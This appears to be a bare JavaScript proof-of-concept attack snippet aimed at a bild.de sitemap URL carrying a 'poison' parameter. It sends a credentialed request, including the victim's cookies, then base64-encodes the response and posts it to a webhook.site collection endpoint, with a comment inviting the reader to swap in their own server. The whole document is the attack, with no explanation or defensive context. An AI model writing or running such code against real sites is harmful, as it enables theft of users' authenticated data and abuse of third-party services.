fetch("https://www.bild.de/sitemap-index-200605.xml?poison=1", {
  method: "GET",
  credentials: "include"
})
  .then(res => res.text())
  .then(data => {
    // Replace with your server if needed
    fetch("https://webhook.site/your-endpoint?data=" + btoa(data));
  });
